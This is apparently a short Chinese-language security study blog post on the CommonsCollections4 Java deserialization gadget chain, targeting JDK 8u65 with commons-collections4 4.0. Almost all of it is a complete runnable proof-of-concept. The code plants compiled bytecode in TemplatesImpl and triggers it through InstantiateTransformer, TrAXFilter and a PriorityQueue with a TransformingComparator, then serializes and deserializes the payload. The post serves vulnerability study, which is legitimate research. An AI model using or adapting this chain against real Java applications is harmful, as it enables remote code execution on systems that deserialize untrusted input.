# 环境

- [JDK8u65](https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html)
- [openJDK 8u65](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4)
- Maven 3.6.3
- Commons-Collections 4.0

```java
<dependency>  
 <groupId>org.apache.commons</groupId>  
 <artifactId>commons-collections4</artifactId>  
 <version>4.0</version>  
</dependency>
```

# CC4

看一下ysoserial给的利用链：

```java
/*
 * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */
```

CC4似乎只是CC2使用了CC3中的InstantiateTransformer。

突然发现之前CC2的博客考虑过这种方案了。。。：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC2_TemplatesImpl_8u65 {
    private static void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }
    public static void main(String[] args) throws Exception{
        byte[] codes = Files.readAllBytes(Paths.get("E:\\研究生\\JavaSec\\code\\target\\classes\\Calc.class"));
        byte[][] _bytecodes = new byte[][] {codes};
        TemplatesImpl templates = new TemplatesImpl();
        setFiledValue(templates, "_bytecodes", _bytecodes);
        setFiledValue(templates, "_name", "whatever");
        setFiledValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer[] faketransformer = new org.apache.commons.collections4.Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        };
        Transformer transformerChain = new ChainedTransformer(faketransformer);
        Comparator transformingcomparator = new TransformingComparator(transformerChain);
        PriorityQueue priorityQueue = new PriorityQueue(2,transformingcomparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(priorityQueue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

# 总结

狠狠水一篇。